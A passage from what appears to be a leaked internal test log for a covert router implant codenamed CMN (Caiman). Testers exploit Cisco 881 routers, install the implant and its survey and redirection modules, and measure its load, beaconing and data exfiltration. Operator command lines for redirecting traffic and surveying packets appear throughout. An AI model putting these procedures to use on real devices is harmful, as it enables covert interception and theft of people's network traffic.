</li>
<li><p>Saved report to share</p></li>
<li>Solarwinds of CPU during test<br><p><i>('image' missing)</i></p>
</li>
<li>Solarwinds of memory during test<br><p><i>('image' missing)</i></p>
</li>
</ol>
</li>
<li>Test Admin activities while <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> present<ol>
<li>Uploaded survey module to <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> so that both modules are loaded up</li>
<li>Loaded redir rules to exercise <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> during tests:<br><p>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|1800<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|1800<br>redir_show</p>
</li>
<li>
<p>Performed the following</p>
<ol>
<li>show flash, show log, show ver, show ip int br, show tech</li>
<li>clear arp, mac-address-table, crypto isakmp, crypto session, eigrp service-family ipv4 neighbors, ip nat trans, cef table</li>
<li>added a user, deleted a user, bounced an interface</li>
<li>
<span style="color: rgb(255,0,0);">debug commands</span> - found an issue relating to debug if-mgr trace all.  Get debug output from this command even after it should have been disabled by undebug all.  Debug output occurs every time running-config is accessed as in for show run, copy run tftp flash:. wr mem.  Rebooted to remove <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and found the issue still exists. Could be Cisco issue.  investigating...</li>
</ol>
</li>
</ol>
</li>
<li>IXIA Test - with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 22 hour test<ol>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start with a clean device.</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules, version 5.0.1</li>
<li>At start of test at 4:10PM, <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> CPU and memory:<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 5%/0%; one minute: 6%; five minutes: 6%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 8 15 533 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 12 401 29 0.00% 0.01% 0.00% 0 Load Meter<br> 3 0 1 0 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41797668 122233788 114186332 109246724<br> I/O E700000 26214400 9693928 16520472 16514336 1651430</p>
<p> </p>
</li>
<li><p>Saved report to share</p></li>
<li>Solarwinds CPU during test:<br><p><i>('image' missing)</i></p>
</li>
<li>Solarwinds Memory During test:<br><p><i>('image' missing)</i></p>
</li>
</ol>
</li>
<li>IXIA Test - with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and Survey Scenario - 22 hour test<ol>
<li>Reloaded DUT</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules</li>
<li>Loaded up a survey scenario scheduled to run for 20 hours<br><p>survey_add_scenario|1|00:20:00:00|00:05:00|protocol|source_addr|source_port|dest_addr|dest_port<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|UDP<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP<br>survey_start_scenario|1|offset|00:00:00:10<br>survey_show</p>
<br><p>Scenario ID: 1<br> Start Time: 2015-07-29_19:52:02_GMT<br> Duration: 72000<br> Resolution: 300<br> Quantifier Fields: Protocol Source Address Source Port Destination Address Destination Port <br> Time Remaining: 71953<br> Filter(s): <br> Filter ID: 0<br> Filter Type: Accept<br> Address, Port(s), and Netmask: <br> <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>(0) 255.255.255.255<br> Filter ID: 1<br> Filter Type: Accept<br> Address, Port(s), and Netmask: <br> <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>(0) 255.255.255.255</p>
</li>
<li>
<p>At start of test at 4:10pm, <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> CPU and memory:</p>
<p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 5%/0%; one minute: 6%; five minutes: 6%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 8 15 533 0.00% 0.00% 0.00% 0 Chunk Manager</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41911660 122119796 116887828 111871180<br> I/O E700000 26214400 9693928 16520472 16497184 16497148</p>
</li>
<li>Solarwinds report of CPU during test:<br><p><i>('image' missing)</i></p>
</li>
<li>Solarwinds report of <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> memory during test:<br><p><i>('image' missing)</i></p>
</li>
</ol>
</li>
<li>Test Latency to Blot<ol>
<li>Reloaded DUT</li>
<li>Attacked with <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> and installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.1</li>
<li>used tc to add 1000 ms latency to blot proxy server</li>
<li>Beaconed successfully </li>
<li>Uploaded survey module - successful</li>
<li>Ran suvey show - successful</li>
<li>Uploaded redir module successfully</li>
<li>Ran redir show - successful</li>
<li>deleted both modules - successful</li>
<li>increased latency to 1500ms</li>
<li>successfully beaconed and uploaded survey module</li>
<li>successfully uploaded redir module</li>
<li>Deleted both modules</li>
<li>Increased latency to 2000 ms</li>
<li>Successfull beaconed and uploaded both modules with 2000ms latency</li>
<li>Increased latency to 2500 ms</li>
<li>successfully beaconed and installed both modules</li>
</ol>
</li>
<li>IXIA test - no CMN, 72 hours<ol>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start without CMN</li>
<li>Ran the same IXIA test as the previous except changed time to 72 hours.</li>
<li>DUT CPU and memory at start of test at 3:10<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 3%/0%; one minute: 3%; five minutes: 3%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 4 15 266 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 4 141 28 0.00% 0.01% 0.00% 0 Load Meter<br> 3 4 1 4000 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers<br> 5 764 116 6586 0.00% 0.10% 0.08% 0 Check heaps<br> 6 0 1 0 0.00% 0.00% 0.00% 0 Pool Manager<br> 7 0 1 0 0.00% 0.00% 0.00% 0 DiscardQ Backgro<br> 8 0 2 0 0.00% 0.00% 0.00% 0 Timers<br> 9 0 14 0 0.00% 0.00% 0.00% 0 WATCH_AFS<br> 10 0 1 0 0.00% 0.00% 0.00% 0 License Client N<br> 11 0 1 0 0.00% 0.00% 0.00% 0 Image License br</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br> Address Bytes Prev Next Ref PrevF NextF Alloc <span class="glossary">PC<span class="glossary-tt">Personal Computer</span></span> what<br>Processor 84A91420 164031456 41138868 122892588 113439576 108511304<br> I/O E700000 26214400 9693928 16520472 16510816 16510780</p>
</li>
<li>
<p>Solarwinds <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> CPU during test:<br></p>
<p><i>('image' missing)</i></p>
</li>
<li>Solarwinds <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> memory during test:<br><p><i>('image' missing)</i></p>
</li>
</ol>
</li>
<li>IXIA Test - 22 hour with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and redir active<ol>
<li>reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start with clean device</li>
<li>IAC attacked and installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.1</li>
<li>Loaded both modules</li>
<li>Configured the following redir to remain in effect for 20 hours<br><p>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|72000<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|72000<br>redir_show</p>
<p> </p>
<p>[root@blot-spicerack receive]# more 20150803161217_0000014474.rules<br>Rule ID: 12<br> Rule is enabled<br> Time Remaining for Rule: 71998<br> Protocol Match: TCP<br> Type: interface<br> Matching Source and Destination Address(es) and Port(s):<br> <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>:(All Ports) -&gt; <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>:(All Ports)<br> Rewrite Source and Destination Address and Port:<br> 172.20.13.20:(Unchanged) -&gt; <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>:(Unchanged)</p>
<p>Rule ID: 11<br> Rule is enabled<br> Time Remaining for Rule: 71997<br> Protocol Match: TCP<br> Type: interface<br> Matching Source and Destination Address(es) and Port(s):<br> <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>:(All Ports) -&gt; 172.20.13.20:(All Ports)<br> Rewrite Source and Destination Address and Port:<br> <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>:(Unchanged) -&gt; <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>:(Unchanged)</p>
</li>
<li>Added a wget to the Seeds host every 2s for <span class="external">www.coverweb.com,</span> which will fire the redirect rule to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>.  Verified that web traffic from seeds host to <span class="external">www.coverweb.com</span> is being redirected.</li>
<li>DUT memory and CPU at start of test, kicked off at 12:30:</li>
<li>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 42072824 121958632 117094884 112057976<br> I/O E700000 26214400 9549340 16665060 16501088 16514492</p>
<p> </p>
<p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 7%/0%; one minute: 6%; five minutes: 6%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 4 18 222 0.00% 0.00% 0.00% 0 Chunk Manager</p>
<br><br>
</li>
<li><p>Solarwinds report of CPU during test:<br><img src="files/CPU-22hour-WITH-CMN-AND-REDIR.png" height="250"></p></li>
<li>Solarwinds report of Memory during test:<br><p><i>('image' missing)</i></p>
</li>
</ol>
</li>
<li>IXIA test - Steady traffic at 5Mbps -Baseline, no CMN<ol>
<li>Used same NN as in all previous tests, however adjust appsim to use 5 Mbps of constant traffic instead of a range of 1-10 and only run for 4 hours.  Also, changed ramp up/ramp down time from 30seconds to 5 minutes on each side.</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start with clean device</li>
<li>Memory and CPU before test started:<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 3%/0%; one minute: 3%; five minutes: 3%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 4 15 266 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 0 236 0 0.00% 0.01% 0.00% 0 Load Meter<br> 3 0 1 0 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers<br> 5 1332 200 6660 0.00% 0.11% 0.10% 0 Check heaps<br> 6 0 1 0 0.00% 0.00% 0.00% 0 Pool Manager<br> 7 0 1 0 0.00% 0.00% 0.00% 0 DiscardQ Backgro<br> 8 0 2 0 0.00% 0.00% 0.00% 0 Timers<br> 9 0 13 0 0.00% 0.00% 0.00% 0 WATCH_AFS<br> 10 0 1 0 0.00% 0.00% 0.00% 0 License Client N<br> 11 0 1 0 0.00% 0.00% 0.00% 0 Image License br</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br> Address Bytes Prev Next Ref PrevF NextF Alloc <span class="glossary">PC<span class="glossary-tt">Personal Computer</span></span> what<br>Processor 84A91420 164031456 41146220 122885236 113845784 108916932<br> I/O E700000 26214400 9693928 16520472 16497600 16497564</p>
<p> </p>
<p><br> Processor memory</p>
<p>Address Bytes Prev Next Ref PrevF NextF Alloc <span class="glossary">PC<span class="glossary-tt">Personal Computer</span></span> what<br>84A91420 0004473596 00000000 84ED574C 000 0 8768923C 82117940 *Init*<br>84ED574C 0000000404 84A91420 84ED5910 001 -------- -------- 820EDE80 *Init*<br>84ED5910 0000000116 84ED574C 84ED59B4 001 -------- -------- 820B2184 Managed Chunk Queue Elements<br>84ED59B4 0000131076 84ED5910 84EF59E8 001 -------- -------- 8034EE38 *Init*</p>
</li>
<li><p>Test began at 5:03pm</p></li>
<li>Solarwinds Memory during test:<br><p><i>('image' missing)</i></p>
</li>
<li>Solarwinds CPU during test<br><p><i>('image' missing)</i></p>
</li>
</ol>
</li>
<li>IXIA test - Steady traffic at 5Mbps - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> plus modules<ol>
<li>Reloaded DUT</li>
<li>Attacked with <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> and installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules</li>
<li>Used same test parameters as previous test</li>
<li>show mem and cpu before test start 2pm:<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 5%/0%; one minute: 6%; five minutes: 6%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 4 15 266 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 16 476 33 0.00% 0.02% 0.00% 0 Load Meter<br> 3 4 1 4000 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers<br> 5 4300 398 10804 0.00% 0.15% 0.17% 0 Check heaps<br> 6 0 1 0 0.00% 0.00% 0.00% 0 Pool Manager<br> 7 0 1 0 0.00% 0.00% 0.00% 0 DiscardQ Backgro<br> 8 0 2 0 0.00% 0.00% 0.00% 0 Timers<br> 9 0 46 0 0.00% 0.00% 0.00% 0 WATCH_AFS<br> 10 0 1 0 0.00% 0.00% 0.00% 0 License Client N<br> 11 0 1 0 0.00% 0.00% 0.00% 0 Image License br</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41783304 122248152 115653476 110672392<br> I/O E700000 26214400 9693928 16520472 16513344 16513308</p>
</li>
<li><p>Graphs saved to share</p></li>
</ol>
</li>
<li>Reload Devices adjacent to <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> while <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed<ol>
<li>CMN is currently installed non-persistenly with modules uploaded</li>
<li>Reloaded Seeds host - no Traps produced, implant still beacons.  When seeds came back up i restarted seeds traffic.  implant still beaconing when triggered.</li>
<li>Cannot reload other devices at this time without impacting IXIA test running on other 881.</li>
</ol>
</li>
<li>IXIA - 4 hour test, no cmn, 10Mbps of traffic<ol>
<li>Reloaded DUT</li>
<li>Changed test parameters to use a steady 10Mbps of traffic</li>
<li>DUT CPU and memory at start of test at 6:50:<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 3%/0%; one minute: 3%; five minutes: 3%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 0 15 0 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 0 316 0 0.00% 0.01% 0.00% 0 Load Meter<br> 3 0 1 0 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers<br> 5 1704 262 6503 0.55% 0.15% 0.11% 0 Check heaps<br> 6 0 1 0 0.00% 0.00% 0.00% 0 Pool Manager<br> 7 0 1 0 0.00% 0.00% 0.00% 0 DiscardQ Backgro<br> 8 0 2 0 0.00% 0.00% 0.00% 0 Timers<br> 9 0 15 0 0.00% 0.00% 0.00% 0 WATCH_AFS<br> 10 0 1 0 0.00% 0.00% 0.00% 0 License Client N<br> 11 0 1 0 0.00% 0.00% 0.00% 0 Image License br</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41273364 122758092 116317596 111302136<br> I/O E700000 26214400 9693928 16520472 16501824 16501788</p>
</li>
<li>Test results saved to share</li>
</ol>
</li>
<li>Performance with only Seeds traffic<br><ol>
<li>show proc cpu hist for the time before attack, <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> attack and <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> upload, and then just <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> running:<br><br>
</li>
<li><p><img src="files/image2015-8-6&#32;10:19:34.png" height="250"></p></li>
<li>Solarwinds graph of CPU during the last two hours showing same events:<br><img src="files/CPU-before-and-after-CMN.png" height="250"><br><br>
</li>
</ol>
</li>
<li>Characterizing Isue observed - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> not picking up <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> replies from active internet detection attempt<ol>
<li>Observed this issue following previous IXIA test after I installed CMN.  CMN did not beacon.  Ensured Seeds traffic was running.  Observed in wireshark that <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> SYN/ACK packets from <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> passive internet checks to <span class="external">www.google.com</span> were making it back to seeds host.</li>
<li>Ensured Seeds traffic is running</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> and installed a debug version of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - beaconed successfully</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> and installed a debug version of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - beaconed successfully</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> and kicked off a 20 minute IXIA test with the same settings as I had run previously, then after test was complete, waited ten minutes, then installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - beaconed successfully</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> and installed a debug version of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - beaconed successfully</li>
<li>Trying on 881-Top with regular version of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - successful</li>
<li>Tried again to run an IXIA test on 881-Bottom and then implant.  The initial beacon worked, but subsequent triggered beacons did not work.  Saw the following in debug output:<br><p>@@@ 00+00:56:50 EE vector: ivec= 0x0B<br>@@@ 00+00:56:54 Triggering Beacon on Original LPs<br>@@@ 00+00:56:55 Starting triggered beacon session.<br>@@@ 00+00:56:55 dns_lookup: sending query for <span class="external">www.google.com</span><br>@@@ 00+00:56:55 Probe <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> request sent.<br>@@@ 00+00:56:55 dns_parse_response: answer is <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span><br>@@@ 00+00:56:55 Got probe <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> answer.<br>@@@ 00+00:56:55 EE vector: ivec= 0x0B<br>@@@ 00+00:56:56 Connecting to probe server...<br>@@@ 00+00:57:00 EE vector: ivec= 0x0B<br>@@@ 00+00:57:05 EE vector: ivec= 0x0B<br>@@@ 00+00:57:10 EE vector: ivec= 0x0B</p>
</li>
<li><p>CMN is not picking up the <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> reply.  Worked with <span class="user">User #76523</span>/CMN and it appears to be an issue with <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> learning interfaces correctly after the IXIA has been putting traffic through - one difference is that the IXIA pushes tunnel traffic whereas regular seeds traffic goes outside the tunnel.  <span class="user">User #76523</span> has enough information to attempt to repro at the bakery.  All debug output captured if needed.</p></li>
</ol>
</li>
<li>IXIA performance test - <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> with 10M - 4 hour test<ol>
<li>reloaded DUT</li>
<li>attacked with <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> and installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules</li>
<li>DUT mem and CPU at start of test at 4:50<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 5%/0%; one minute: 6%; five minutes: 7%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 4 15 266 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 8 200 40 0.07% 0.02% 0.00% 0 Load Meter<br> 3 0 1 0 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers<br> 5 1716 166 10337 0.00% 0.19% 0.18% 0 Check heaps<br> 6 0 1 0 0.00% 0.00% 0.00% 0 Pool Manager<br> 7 0 1 0 0.00% 0.00% 0.00% 0 DiscardQ Backgro<br> 8 0 2 0 0.00% 0.00% 0.00% 0 Timers<br> 9 0 52 0 0.00% 0.00% 0.00% 0 WATCH_AFS<br> 10 0 1 0 0.00% 0.00% 0.00% 0 License Client N<br> 11 0 1 0 0.00% 0.00% 0.00% 0 Image License br</p>
<p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41719784 122311672 113260968 108337984<br> I/O E700000 26214400 9693928 16520472 16511040 16511004</p>
</li>
<li><p>Test complete and results are saved to share.  </p></li>
</ol>
</li>
<li>IXIA performance test - Stack Scrambler<ol>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start with clean device</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and modules</li>
<li>Set up IXIA with a Stack Scrambler test component and same NN as used in previous <span class="user">User #?</span>.  Configured 5Mbps of constant traffic, a max of 1 corruption per packet, and set all corruption values to 100.</li>
<li>Test ran for 15 hours overnight.  Saved report (Scrambler_3) to the share.  DUT did not reboot or crash.  Device operating normally, passing traffic.  Was able to successfully beacon <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> ten times this morning when I came in.  No syslogs or traps generated on the DUT <br>during the test.</li>
<li>Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> to start with clean device</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.1 and modules</li>
<li>Uploaded the following survey scenario:<br><p>survey_add_scenario|1|00:04:00:00|00:05:00|protocol|source_addr|source_port|dest_addr|dest_port<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.X (CORE2[US])</span>|255.255.255.0|0|0|UDP<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.X (CORE2[US])</span>|255.255.255.0|0|0|TCP<br>survey_start_scenario|1|offset|00:00:00:10<br>survey_show</p>
</li>
<li><p>Kicked off 4 hour stack scrambler test with same paramters as previous test at 10:28.</p></li>
<li>Test completed - <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> did not crash/reboot or produce any syslogs or <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> Traps.  Collected results from solarwinds and saved to share.</li>
</ol>
</li>
<li>Change <span class="glossary">DHCP<span class="glossary-tt">Dynamic Host Configuration Protocol</span></span> address while <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> running<ol>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules</li>
<li>Changed the <span class="glossary">DHCP<span class="glossary-tt">Dynamic Host Configuration Protocol</span></span> assignment on the TR-Core router and then bounced the clear the <span class="glossary">DHCP<span class="glossary-tt">Dynamic Host Configuration Protocol</span></span> binding to renew the IP address</li>
<li>IP address didn't renew when i cleared the binding on TR-Core - the 881-Bottom kept the same IP address so I bounced the f4 interface</li>
<li>Interface came back up and learned the new IP address <span class="redact">XXX.XX.XXX.X (WIFI-ID[ID])</span>.  CMN beaconed successfully and showed new IP in the .rcvd file on spicerack.</li>
</ol>
</li>
<li>Testing exfil of survey data after Scrambler test<ol>
<li>Attacked <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> with IAC, then installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and both modules.  This build of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> is now using the operational <span class="glossary">LP<span class="glossary-tt">Listening Post</span></span> domain name.</li>
<li>Uploaded the following 4 hour scenario:<br><p>survey_add_scenario|1|00:04:00:00|00:05:00|protocol|source_addr|source_port|dest_addr|dest_port<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.X (CORE2[US])</span>|255.255.255.0|0|0|UDP<br>survey_add_filter|1|accept|<span class="redact">XXX.XXX.XXX.X (CORE2[US])</span>|255.255.255.0|0|0|TCP<br>survey_start_scenario|1|offset|00:00:00:10<br>survey_show</p>
</li>
<li><p>Kicked off 2 hour Ixia scrambler test</p></li>
<li>Test completed, scenario still running.  Sent a command to end survey scenario</li>
<li>Data exfil'd and unscrambled successfully</li>
</ol>
</li>
<li>Received 5.0.2 today on 8/27/15 from CMN.  Installed on Top (sticky norb) and Bottom (norb) 881s. Successfully beaconed with 2048 bit cert.</li>
<li>Verify Beacon failure retries<ol>
<li>Observed traffic on 4.4.4.4 dns server and on blot proxy.  Disabled interface on spicerack so that beacons will fail.</li>
<li>Reloaded 881-Top that has CNM sticky installed - beacon retries value is set to 4.  Expected result is 5 tcp syn packets to blot proxy and 5 <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> lookups to 4.4.4.4 for active internet detection.</li>
<li>Actual behavior observed - 6 syn packets sent and 6 active internet lookups.</li>
<li>Made a new build of <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> with the beacon retries set to 3.  In addition, this build uses the real Internet PROBE LIST.  All the sites for the probe list have been added to 4.4.4.4</li>
<li>Observed a failure of active internet step of lookup to probe dest - appears to have produced an admin prohibited message.  It scrolled by quickly, but need to re-test to verify <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> is still picking up the <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> packet even if the result is that the lookup failed.</li>
